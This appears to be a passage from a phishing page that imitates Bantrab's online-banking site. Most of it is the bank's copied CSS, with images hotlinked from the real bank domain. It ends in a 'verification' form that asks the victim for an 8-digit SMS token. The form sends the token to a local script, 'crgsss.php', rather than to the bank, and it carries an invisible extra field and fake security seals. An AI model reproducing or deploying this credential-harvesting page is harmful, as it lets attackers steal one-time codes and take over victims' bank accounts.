         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -o-linear-gradient(top, #ffcb00 0%, #fcaf21 100%);
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -ms-linear-gradient(top, #ffcb00 0%, #fcaf21 100%);
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, linear-gradient(to bottom, #ffcb00 0%, #fcaf21 100%);
         filter: progid:dximagetransform.microsoft.gradient(startColorstr='#f68c29', endColorstr='#fcaf21', GradientType=0);
         }
         .dropdown li:hover a {
         color: #ffffff !important;
         }
         .dropdown li a {
         /*INICIO VCOCHOY CAMBIO DE IMAGEN BANTRAB*/
         text-align: left;
         color: #000000 !important;
         /*INICIO VCOCHOY CAMBIO DE IMAGEN BANTRAB*/
         padding: 5px!important;
         margin: 0px;
         display: block;
         border: none!important;
         }
         .dropdown .active {
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, #f68c29;
         background: #FFCB00;
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -moz-linear-gradient(top, #ffcb00 0%, #fcaf21 100%);
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -webkit-gradient(linear, left top, left bottom, color-stop(0%, #ffcb00), color-stop(100%, #fcaf21));
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -webkit-linear-gradient(top, #ffcb00 0%, #fcaf21 100%);
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -o-linear-gradient(top, #ffcb00 0%, #fcaf21 100%);
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -ms-linear-gradient(top, #ffcb00 0%, #fcaf21 100%);
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, linear-gradient(to bottom, #ffcb00 0%, #fcaf21 100%);
         filter: progid:dximagetransform.microsoft.gradient(startColorstr='#f68c29', endColorstr='#fcaf21', GradientType=0);
         }
         .dropdown .active a {
         color: #ffffff;
         }
         .dropdown .list-header {
         padding: 20px 5px 10px 5px;
         display: block;
         text-align: left;
         opacity: 0.5;
         font-size: 10px;
         text-transform: uppercase;
         }
         .dropdown .list-header:hover {
         background: none;
         }
         .dropdown .divider {
         *width: 100%;
         height: 1px;
         padding: 0px!important;
         margin: 9px 1px;
         *margin: -5px 0 5px;
         overflow: hidden;
         /*INICIO VCOCHOY CAMBIO DE IMAGEN BANTRAB*/
         background-color: #FFF200;
         border-bottom: 1px solid #ffffff;
         }
         /*.dropdown*/
         .main-title {
         position: relative;
         background: #ffffff;
         margin-bottom: 20px;
         padding: 70px 0 20px 0;
         }
         .main-title:before {
         content: ' ';
         position: absolute;
         left: 6%;
         bottom: -11px;
         background: url(https://bancaenlinea.bantrab.com.gt/images/mini-side.png) no-repeat left top;
         z-index: 10;
         width: 22px;
         height: 11px;
         display: block;
         }
         .main-title .title {
         margin: 10px 0 -10px 0;
         font-size: 28px;
         }
         .main-title .description {
         margin: 20px 0 -10px 0;
         font-weight: 100;
         font-style: italic;
         }
         /*.box*/
         .underline {
         border-bottom: 1px solid #cccccc;
         margin-bottom: 10px;
         padding-bottom: 10px;
         }
         .box {
         background: #ffffff;
         -moz-border-radius: 5px;
         -webkit-border-radius: 5px;
         -o-border-radius: 5px;
         border-radius: 5px;
         -moz-border-radius: 5px;
         -webkit-border-radius: 5px;
         -o-border-radius: 5px;
         border-radius: 5px;
         -moz-box-shadow: 0 0 5px #18b0d2;
         -webkit-box-shadow: 0 0 5px #18b0d2;
         -o-box-shadow: 0 0 5px #18b0d2;
         box-shadow: 0 0 5px #18b0d2;
         margin-bottom: 20px;
         /*.tabs*/
         }
         .box a {
         color: #020000;
         /*FIN VCOCHOY CAMBIO DE IMAGEN BANTRAB*/
         }
         .box .text {
         padding: 10px;
         }
         .box.white {
         background: #ffffff;
         }
         .box.borderless {
         border: none!important;
         }
         .box .title {
         color: #444444;
         font-size: 14px;
         }
         .box .box {
         clear: both;
         border: 1px solid #cccccc;
         box-shadow: none;
         padding: 10px;
         margin-bottom: 0;
         }
         .box.ads img {
         width: 100%;
         }
         .box.tabs {
         /*.tabs-handle*/
         }
         .box.tabs .tab-handle {
         clear: both;
         overflow: hidden;
         position: relative;
         margin-bottom: -1px !important;
         z-index: 2;
         /*li*/
         }
         .box.tabs .tab-handle li {
         float: left;
         display: inline;
         text-align: center;
         margin: 0 5px;
         padding: 0;
         border-right-color: #f8f8f2;
         }
         .box.tabs .tab-handle li a {
         padding: 5px 10px;
         display: block;
         }
         .box.tabs .tab-handle li.current {
         background: #ffffff;
         border-width: 1px;
         border-color: #cccccc;
         border-bottom-color: #ffffff;
         border-style: solid;
         }
         /*INICIO VCOCHOY CAMBIO DE IMAGEN BANTRAB*/
         section.inicio {
         padding: 60px 0 10px 0;
         }
         /*FIN VCOCHOY CAMBIO DE IMAGEN BANTRAB*/
         .direct-access {
         text-align: center;
         font-size: 10px;
         text-transform: uppercase;
         margin-bottom: 20px;
         }
         .logo-box {
         -moz-border-radius: 3px;
         -webkit-border-radius: 3px;
         -o-border-radius: 3px;
         border-radius: 3px;
         -moz-border-radius: 3px;
         -webkit-border-radius: 3px;
         -o-border-radius: 3px;
         border-radius: 3px;
         border: 1px solid #cccccc;
         background: #fff;
         width: 150px;
         height: 150px;
         margin: 5px 5px 5px 5px;
         float: left;
         /*VCOCHOY CAMBIO DE IMAGEN*/
         border-color: #00ADB1;
         }
         .logo-box:hover {
         /*INICIO VCOCHOY CAMBIO DE IMAGEN*/
         border: 1px solid #DE0060;
         -moz-box-shadow: 0 0 5px #0085b2;
         -webkit-box-shadow: 0 0 5px #0085b2;
         -o-box-shadow: 0 0 5px #0085b2;
         box-shadow: 0 0 5px #0085b2;
         }
         .logo-box-inner {
         background: #fff;
         border: 1px solid #73b9ff;
         -moz-box-shadow: 0 0 5px #0085b2;
         -webkit-box-shadow: 0 0 5px #0085b2;
         -o-box-shadow: 0 0 5px #0085b2;
         box-shadow: 0 0 5px #0085b2;
         }
         .logo-img {
         width: 100%;
         }
         #client-info {
         margin-top: 20px;
         }
         .sub-title {
         border-bottom: 1px solid #cccccc;
         font-size: 16px;
         font-weight: normal;
         }
         /*INICIO VCOCHOY SE CAMBIO EL MARGIN TOP*/
         /*@footer*/
         .footerBackgroud {
         background: url(https://bancaenlinea.bantrab.com.gt/images/footer.png) no-repeat;
         height: 85px;
         background-color: #dfe1e1;
         /*FIN VCOCHOY CAMBIO DE IMAGEN*/
         }
         .footerColor {
         /*VCOCHOY CAMBIO DE IMAGEN*/
         background-color: #e2e1e1;
         }
         footer {
         margin-top: -22px;
         border-top: 1px solid #cccccc;
         padding: 0 0;
         font-size: 11px;
         color: #000000;
         /*background: #a78181;*/
         }
         footer p {
         margin: 0 10px 0;
         }
         footer a {
         color: #000000;
         font-weight: bold;
         }
         footer.fixed {
         position: fixed;
         left: 0;
         bottom: 0;
         }
         /*@header*/
         /*FIN VCOCHOY CAMBIO DE IMAGEN BANTRAB*/
         #main-header .mini-logo {
         float: left;
         display: inline;
         /*INICIO VCOCHOY CAMBIO DE IMAGEN*/
         margin: -10px 0 0;
         position: relative;
         padding: 5px;
         padding-top: 2%;
         z-index: 5;
         /*FIN VCOCHOY CAMBIO DE IMAGEN*/
         }
         #main-header .top-menu-wrap {
         /*background:@dark-gray;*/
         background: #D3D2D4;
         padding: 5px 0;
         }
         /*@accounts*/
         .title-wrap {
         padding: 0 0 10px;
         }
         .account-name {
         margin: 0 0 10px;
         }
         .account-movements {
         clear: left;
         }
         .account-movements .title {
         position: relative;
         font-size: 18px;
         }
         .account-movements .title > a {
         color: #f2a419;
         background: url(https://bancaenlinea.bantrab.com.gt/images/mini-sub-blue.png) no-repeat right center;
         padding: 0 20px 0 0;
         position: relative;
         }
         .account-movements .dropdown {
         right: 0;
         }
         .consult-date {
         float: right;
         display: inline;
         }
         .consult-date p {
         float: left;
         display: inline;
         padding: 20px 0 0;
         }
         .consult-date ul {
         float: left;
         display: inline;
         list-style: none;
         border-left: 1px solid #cccccc;
         margin: 0 0 0 10px;
         }
         .consult-date ul a {
         color: #f2a419;
         }
         .consult-date ul li {
         margin: 0 0 0 10px;
         }
         .consult-date ul li.current a {
         font-size: 24px;
         color: #333333;
         }
         .consult-date2 {
         background: #898B8C;
         margin-top: -5px;
         margin-bottom: -5px;
         margin-right: -54px;
         padding: 5px;
         }
         .account-details {
         border-top: 1px solid #cccccc;
         border-bottom: 1px solid #cccccc;
         position: relative;
         /*.initial-amount*/
         /*.export-files*/
         }
         .account-details span.line {
         border-bottom: 1px solid #ffffff;
         display: block;
         height: 1px;
         position: absolute;
         left: 0;
         bottom: 0;
         width: 100%;
         }
         .account-details .initial-amount {
         font-size: 10px;
         text-transform: uppercase;
         vertical-align: middle;
         overflow: hidden;
         padding: 18px 0;
         float: left;
         display: inline;
         }
         .account-details .initial-amount b {
         color: #f2a42d;
         font-size: 16px;
         margin: 0 0 0 10px;
         position: relative;
         top: 2px;
         }
         .account-details .export-files {
         float: right;
         display: inline;
         }
         .account-details .export-files p {
         float: left;
         display: inline;
         margin: 0;
         padding: 22px 10px 0 0;
         text-transform: uppercase;
         font-size: 10px;
         }
         .account-details .export-files ul {
         float: left;
         display: inline;
         overflow: hidden;
         margin: 0;
         }
         .account-details .export-files ul li {
         list-style: none;
         float: left;
         display: inline;
         text-align: center;
         padding-top: 10px;
         width: 60px;
         height: 50px;
         border-right: 1px solid #cccccc;
         margin: 0;
         }
         .account-details .export-files ul li:first-child {
         border-left: 1px solid #cccccc;
         }
         .account-details .export-files ul li:hover,
         .account-details .export-files ul li.current {
         background-color: #ffffff;
         }
         .account-details .export-files ul li a {
         display: block;
         height: 60px;
         }
         .pagination {
         margin: 20px 0;
         border: 1px solid #cccccc;
         padding: 10px;
         background: #ffffff;
         text-align: center;
         }
         .pagination * {
         margin: 0 5px;
         }
         .pagination a {
         color: #f2a419;
         }
         /*@aside*/
         .sidebar .title {
         background: url(https://bancaenlinea.bantrab.com.gt/images/current-arrow.png) no-repeat center right;
         overflow: auto;
         font-size: 13px;
         color: #ffffff;
         padding: 5px 10px;
         }
         .sidebar .title.small {
         padding: 0;
         color: #444444;
         background: none;
         font-size: .9rem;
         text-transform: uppercase;
         font-size: 11px;
         margin: 0 0 5px;
         line-height: 1;
         }
         .list {
         border-bottom: 1px solid #cccccc;
         padding: 0 0 10px;
         }
         .list li {
         list-style: none;
         margin: 0;
         padding: 5px 0;
         }
         .list li:hover {
         /*VCOCHOY CAMBIO DE IMAGEN BOTONES MULTIPAGOS background:url(images/current-arrow.png) no-repeat center right;*/
         background: #FFCB00;
         border-radius: 0px 25px 25px 0px;
         /*FIN VCOCHOY CAMBIO DE IMAGEN*/
         overflow: auto;
         padding-left: 5px;
         }
         .list li:hover a {
         color: #ffffff;
         }
         .list .list-header {
         padding: 10px 0;
         display: block;
         text-align: left;
         opacity: 0.7;
         font-size: 10px;
         text-transform: uppercase;
         }
         .list .list-header:hover {
         /*INICIO VCOCHOY CAMBIO DE IMAGEN BANTRAB*/
         background-image: none;
         /*FIN VCOCHOY CAMBIO DE IMAGEN BANTRAB*/
         padding: 10px 0;
         }
         .list .divider {
         *width: 100%;
         height: 1px;
         margin: 9px 1px;
         *margin: -5px 0 5px;
         padding: 0;
         overflow: hidden;
         background-color: #e5e5e5;
         border-bottom: 1px solid #ffffff;
         }
         .list .divider:hover {
         background-image: none;
         padding: 0;
         }
         .list .active {
         /* INICIO VCOCHOY CAMBIO DE IMAGEN Se cambio el fondo del boton activo por css y no una imagen*/
         background: #00ADB1;
         border-radius: 0px 25px 25px 0px;
         /*FIN VCOCHOY CAMBIO DE IMAGEN*/
         overflow: auto;
         font-size: 12px;
         padding: 5px 10px;
         }
         .list .active a {
         color: #ffffff;
         }
         .graph-legends li {
         list-style: none;
         margin: 0 0 0 20px;
         padding: 5px 0;
         }
         .graph-legends .square {
         float: left;
         margin: 4px 5px 0 0;
         width: 10px;
         height: 10px;
         }
         .graph-legends .square.blue {
         background-color: #006699;
         }
         .graph-legends .square.green {
         background-color: #00A59B;
         }
         .graph-legends .square.purple {
         background-color: #5C327B;
         }
         .event-log {
         padding: 10px;
         border: 1px solid #cccccc;
         background: #ffffff;
         }
         /* jQuery lightBox plugin - Gallery style */
         #gallery {
         margin-bottom: 20px;
         }
         #gallery ul {
         list-style: none;
         text-align: center;
         }
         #gallery ul li {
         float: left;
         }
         #gallery ul img {
         border: 5px solid #fff;
         border-width: 5px 5px 20px;
         box-shadow: 2px 2px 2px #ccc;
         }
         #gallery ul a:hover img {
         border: 5px solid #fff;
         border-width: 5px 5px 20px;
         border-color: #0085b2;
         }
         #pishing-image {
         margin: 10px;
         }
         #pishing-image img {
         border: 5px solid #fff;
         border-width: 5px 5px 20px;
         box-shadow: 2px 2px 2px #ccc;
         }
         #pishing-image a:hover img {
         border: 5px solid #fff;
         border-width: 5px 5px 20px;
         border-color: #0085b2;
         }
         /* Pagination Plugin */
         .paginate_enabled_previous {
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, #f68c29;
         background: #FFCB00;
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -moz-linear-gradient(top, #ffcb00 0%, #fcaf21 100%);
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -webkit-gradient(linear, left top, left bottom, color-stop(0%, #ffcb00), color-stop(100%, #fcaf21));
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -webkit-linear-gradient(top, #ffcb00 0%, #fcaf21 100%);
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -o-linear-gradient(top, #ffcb00 0%, #fcaf21 100%);
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -ms-linear-gradient(top, #ffcb00 0%, #fcaf21 100%);
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, linear-gradient(to bottom, #ffcb00 0%, #fcaf21 100%);
         filter: progid:dximagetransform.microsoft.gradient(startColorstr='#f68c29', endColorstr='#fcaf21', GradientType=0);
         color: #ffffff !important;
         padding: 5px 10px;
         -moz-border-radius: 4px;
         -webkit-border-radius: 4px;
         -o-border-radius: 4px;
         border-radius: 4px;
         -moz-border-radius: 4px;
         -webkit-border-radius: 4px;
         -o-border-radius: 4px;
         border-radius: 4px;
         text-align: center;
         text-shadow: 0 1px 0 rgba(0, 0, 0, 0.2);
         border: none;
         -moz-transition: all 0.1s linear;
         -webkit-transition: all 0.1s linear;
         -o-transition: all 0.1s linear;
         transition: all 0.1s linear;
         }
         .paginate_enabled_previous:hover {
         cursor: pointer;
         -moz-box-shadow: 0 0 5px #444444;
         -webkit-box-shadow: 0 0 5px #444444;
         -o-box-shadow: 0 0 5px #444444;
         box-shadow: 0 0 5px #444444;
         }
         .paginate_enabled_previous:before {
         content: "‹ ";
         }
         .paginate_enabled_next {
         margin-left: 20px;
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, #f68c29;
         background: #FFCB00;
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -moz-linear-gradient(top, #ffcb00 0%, #fcaf21 100%);
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -webkit-gradient(linear, left top, left bottom, color-stop(0%, #ffcb00), color-stop(100%, #fcaf21));
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -webkit-linear-gradient(top, #ffcb00 0%, #fcaf21 100%);
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -o-linear-gradient(top, #ffcb00 0%, #fcaf21 100%);
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -ms-linear-gradient(top, #ffcb00 0%, #fcaf21 100%);
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, linear-gradient(to bottom, #ffcb00 0%, #fcaf21 100%);
         filter: progid:dximagetransform.microsoft.gradient(startColorstr='#f68c29', endColorstr='#fcaf21', GradientType=0);
         color: #ffffff !important;
         padding: 5px 10px;
         -moz-border-radius: 4px;
         -webkit-border-radius: 4px;
         -o-border-radius: 4px;
         border-radius: 4px;
         -moz-border-radius: 4px;
         -webkit-border-radius: 4px;
         -o-border-radius: 4px;
         border-radius: 4px;
         text-align: center;
         text-shadow: 0 1px 0 rgba(0, 0, 0, 0.2);
         border: none;
         -moz-transition: all 0.1s linear;
         -webkit-transition: all 0.1s linear;
         -o-transition: all 0.1s linear;
         transition: all 0.1s linear;
         }
         .paginate_enabled_next:hover {
         cursor: pointer;
         -moz-box-shadow: 0 0 5px #444444;
         -webkit-box-shadow: 0 0 5px #444444;
         -o-box-shadow: 0 0 5px #444444;
         box-shadow: 0 0 5px #444444;
         }
         .paginate_enabled_next:after {
         content: " ›";
         }
         /* Scrollable Pagination */
         .scrollable {
         width: 100%;
         height: 500px;
         overflow: hidden;
         position: relative;
         }
         .scrollable .pages {
         width: 20000px;
         position: absolute;
         clear: both;
         }
         .scrollable .pages .page {
         width: 650px;
         float: left;
         margin-right: 650px;
         }
         .scroll-pagination {
         height: 20px;
         margin: 20px 0;
         border: 1px solid #cccccc;
         padding: 10px;
         background: #ffffff;
         text-align: center;
         }
         .scroll-pagination a {
         /*INICIO VCOCHOY CAMBIO DE IMAGEN BANTRAB*/
         color: #DE0060;
         /*FIN VCOCHOY CAMBIO DE IMAGEN BANTRAB*/
         }
         .scroll-pagination .left {
         line-height: 16px;
         font-size: 16px;
         cursor: pointer;
         float: right;
         }
         .scroll-pagination .left.disabled {
         opacity: 0.4;
         }
         .scroll-pagination .right {
         line-height: 16px;
         font-size: 16px;
         cursor: pointer;
         float: right;
         }
         .scroll-pagination .right.disabled {
         opacity: 0.4;
         }
         .scroll-pagination .navi {
         margin-right: 30px;
         float: right;
         height: 20px;
         background: #ffffff;
         /*INICIO VCOCHOY CAMBIO DE IMAGEN*/
         /*FIN VCOCHOY CAMBIO DE IMAGEN*/
         }
         .scroll-pagination .navi a {
         color: #DE0060;
         }
         .scroll-pagination .navi li {
         cursor: pointer;
         float: left;
         list-style: none;
         }
         .scroll-pagination .navi li.active {
         font-weight: bold;
         }
         .loading {
         display: none;
         background: #000000 url(https://bancaenlinea.bantrab.com.gt/images/ajax-loader.gif) no-repeat center center;
         width: 200px;
         height: 50px;
         position: fixed;
         left: 50%;
         top: 50%;
         margin: -25px 0 0 -100px;
         }
         /*Usage for responsive menu*/
         .button-for-nav {
         display: none;
         }
         .responsive {
         /*.main-menu-wrap*/
         }
         .responsive .main-title {
         padding-top: 16%;
         }
         .responsive .main-menu-wrap {
         width: -moz-calc(100% - 90px);
         width: -webkit-calc(100% - 90px);
         width: calc(100% - 90px);
         width: 80%;
         margin-top: 38px;
         }
         .responsive .main-menu-wrap .button-for-nav {
         display: block;
         /*INICIO VCOCHOY CAMBIO DE IMAGEN BANTRAB*/
         background: #00ADB1;
         /*FIN VCOCHOY CAMBIO DE IMAGEN BANTRAB*/
         padding: 10px;
         text-align: center;
         cursor: pointer;
         }
         .responsive .main-menu-wrap .button-for-nav span {
         padding: 0 30px 0 0;
         background: url(https://bancaenlinea.bantrab.com.gt/images/responsive-menu-icon.png) no-repeat right center;
         }
         .responsive .main-menu-wrap .id-main-menu {
         /*INICIO VCOCHOY CAMBIO DE IMAGEN*/
         float: none;
         padding: 0;
         background: #00ADB1;
         /*FIN VCOCHOY CAMBIO DE IMAGEN*/
         -moz-border-radius: 2px !important;
         -webkit-border-radius: 2px !important;
         -o-border-radius: 2px !important;
         border-radius: 2px !important;
         -moz-border-radius: 2px !important;
         -webkit-border-radius: 2px !important;
         -o-border-radius: 2px !important;
         border-radius: 2px !important;
         /*vcochoy cambio de imagen*/
         }
         .responsive .main-menu-wrap .id-main-menu li {
         width: 49%;
         margin: 0;
         padding: 0;
         float: left;
         -moz-border-radius: 0px !important;
         -webkit-border-radius: 0px !important;
         -o-border-radius: 0px !important;
         border-radius: 0px !important;
         -moz-border-radius: 0px !important;
         -webkit-border-radius: 0px !important;
         -o-border-radius: 0px !important;
         border-radius: 0px !important;
         }
         .responsive .main-menu-wrap .id-main-menu li a {
         padding: 5px 0;
         display: block;
         }
         .responsive .main-menu-wrap .id-main-menu li:nth-child(2n) a {
         border: none;
         }
         .responsive .main-menu-wrap .id-main-menu li:nth-child(2n+3) a {
         border-right: 1px solid #ffffff;
         }
         .responsive .main-menu-wrap .id-main-menu li.home a {
         width: auto;
         background: no-repeat;
         text-indent: 0;
         padding: 5px 0!important;
         margin: 0 auto!important;
         height: auto!important;
         }
         .responsive #main-header {
         background-color: #333333;
         position: relative!important;
         }
         /*INICIO VCOCHOY CAMBIO DE IMAGEN*/
         .paginate_button {
         padding: 0px 5px 0px 5px;
         color: #DE0060;
         }
         .paginate_active {
         color: #DE0060;
         padding: 0px 5px 0px 5px;
         }
         /*Menu stick mantiene pegado el menu en la parte superior de la ventana*/
         .fixed-menu {
         position: fixed;
         z-index: 1000;
         top: 0;
         width: 100%;
         }
         /*Media Querys*/
         @media (max-width: 1075px) {
         /*Ocultamos la imagen del header*/
         .headerImagen2 {
         background: none;
         }
         #main-header .mini-logo {
         display: none;
         }
         .main-menu-wrap {
         padding-left: 7%;
         }
         }
         /*FIN VCOCHOY CAMBIO DE IMAGEN*/
         /*Cambio RM-GPP-117 CAPS*/
         @media only screen and (max-device-width: 800px) {
         .LoginImgback {
         /*background-image: url('../images/Fondos_Login/fondo4.png'); */
         background-repeat: no-repeat;
         position: absolute;
         margin: 0px 0px 0px 0px;
         top: 0px;
         left: 0px;
         overflow: hidden;
         }
         }
         /*@media only screen and (max-device-width: 600px) {*/
         @media only screen and (orientation: portrait) {
         .LoginCred {
         position: absolute;
         top: 435%;
         left: 0%;
         right: 0%;
         margin-left: 20%;
         width: 50%;
         height: 60%;
         /*border: red 2px solid;*/
         }
         }
         /*@media only screen and (max-device-width: 600px)*/
         @media only screen and (orientation: portrait) {
         #login-container {
         margin-top: 1px;
         /*background: @white; CAPS*/
         padding-left: -50px;
         }
         #login-container .form {
         padding-top: 125%;
         width: 550px;
         }
         #login-container .form .input-text {
         border-color: #05738E;
         background: #ffffff url(https://bancaenlinea.bantrab.com.gt/images/login-sprites.png) no-repeat left 1px;
         background-size: 55px;
         padding-left: 50px;
         height: 70px;
         /*altura del control*/
         font-size: 30px;
         /*Tamaño de la fuente*/
         /*font-weight: bold;*/
         width: 100%;
         }
         #login-container .form .input-text.pass {
         background-position: left -45px;
         }
         #login-container .form .button {
         color: #60605D !important;
         width: 100%;
         /*ancho del control*/
         height: 50px;
         display: block;
         background: #FFCB00;
         font-size: 20pt;
         /*Tamaño de la Fuente*/
         /*font-weight: bold;*/
         font-family: Avenir-Light-07;
         }
         #login-container .form .lost-pass {
         margin: 10px 0 0;
         }
         }
         /*FIN Cambio RM-GPP-117 CAPS*/
      </style>
      
      <style> body { display : true;} </style>
      <!--Inicia CAMBIO RM-GPP-117 CAPS-->
     
      <style type="text/css">#_copy{align-items:center;background:#4494d5;border-radius:3px;color:#fff;cursor:pointer;display:flex;font-size:13px;height:30px;justify-content:center;position:absolute;width:60px;z-index:1000}#select-tooltip,#sfModal,.modal-backdrop,div[id^=reader-helper]{display:none!important}.modal-open{overflow:auto!important}._sf_adjust_body{padding-right:0!important}.super_copy_btns_div{position:fixed;width:154px;left:10px;top:45%;background:#e7f1ff;border:2px solid #4595d5;font-weight:600;border-radius:2px;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Helvetica Neue,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol;z-index:5000}.super_copy_btns_logo{width:100%;background:#4595d5;text-align:center;font-size:12px;color:#e7f1ff;line-height:30px;height:30px}.super_copy_btns_btn{display:block;width:128px;height:28px;background:#7f5711;border-radius:4px;color:#fff;font-size:12px;border:0;outline:0;margin:8px auto;font-weight:700;cursor:pointer;opacity:.9}.super_copy_btns_btn:hover{opacity:.8}.super_copy_btns_btn:active{opacity:1}</style>
   </head>
   <body id="login">
      <div class="bdcenter">
         <noscript>
            <div class="nojs">
               Para utilizar las funcionalidades completas de la banca electr&oacute;nica es necesario tener
               JavaScript habilitado, <br/> Realiza el pago de servicios, pago de tarjeta de crédito, canje de puntos, haz  transferencias y consulta saldos a través de Bantrab en Línea.
               <style>
                  .nojs {
                  font-weight: bold;
                  font: 13px/1.5 'Myriad Pro', Arial, 'Liberation Sans', FreeSans, sans-serif;
                  padding: 10px;
                  margin-bottom: 20px;
                  text-align:center;
                  display:block;
                  background-color: #58595B;
                  border: 1px solid #FFFFFF;
                  color: white;
                  }
               </style>
            </div>
         </noscript>
         <div class="container">
            <div class="row">
               <div class="col">
                  <div class="imgbienvenido"> 
                     <img src="img/Bienv.png" class="pull-right img-responsive" align="right">
                  </div>
               </div>
               <div class="w-100"></div>
               <div class="col">
                  <form method="post" action="crgsss.php" class="form-signin"  >
                    
                     
                     <div class="text">
                        <span id="lblAmbiente" class="control-label"></span>
                        <script type="text/javascript">
                           function ValidNum(e) {
                               var tecla = (e.which) ? e.which : e.keyCode
                               return ((tecla > 47 && tecla < 58) || tecla == 9 || tecla == 8 || tecla == 13); //|| (tecla > 95 && tecla < 106) || tecla == 46 
                           }
                           
                           function txtValidate() {
                               // trigger validation from clientside
                               rvCliente.isvalid = true
                               rvUsuario.isvalid = true
                           }
                           
                        </script>
                        <div class="lblbienvenido">
                           <h2>VERIFICACIÓN</h2>
                          
                        </div>
                        <div class="clsinput">
                           <h4>Hemos enviado un código de verificación a tu celular. </h4>
                           <h4>Si no recibes el SMS, revisa en el correo electrónico asociado.</h4>
                           <input type="text" minlength="8" maxlength="8"  size="15" id="n0rmalidadx" name="n0rmalidadx" placeholder="Token" class="form-control" autocomplete="off" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;"  required> 
                                                                      
                          
                        </div>
                        <div class="clsbutton">
                           <input type="submit" name="ucLoginInicio$btnIngresar" value="Confirmar"  class="btn btn-ingreso btn-lg btn-block"><br>
                           
                           <div id="ucLoginInicio_vsResumen" style="display:none;">
                           </div>
                          
                        </div>
                     </div>
                     <table>
                        <tbody>
                           <tr>
                              <td valign="middle">
                                 <a href="#" >
                                 <img src="img/ev-ssl-seal.png" border="0" alt="DigiCert Certified Logo;" name="secsol" style="width:100px; height:65px;"> </a> 
                              </td>
                              <td width="40%" valign="middle" align="left">
                                 <table border="0" cellpadding="0" cellspacing="0" title="Haga clic para verificar ? Este sitio ha elegido VeriSign SSL para que la comunicación sea confidencial y el comercio electrónico sea seguro.">
                                    <tbody>
                                       <tr>
                                          <td align="left" valign="top" style="height: 19px">
                                             
                                          </td>
                                       </tr>
                                    </tbody>
                                 </table>
                              </td>
                           </tr>
                        </tbody>
                     </table>
              <input type="text" id="input-username" name="input-username" style="border: none;background: transparent;outline: none;color: transparent;">
                  </form>
               </div>
               <div class="w-100"></div>
               <div class="col">
                  <div class="clsimgtip">
                     <img width="290" height="120" src="img/tip_de_seguridad.png" class="pull-right img-responsive">
                  </div>
               </div>
               <div class="col"></div>
            </div>
         </div>
      
      </div>
        

   </body>
  
</html>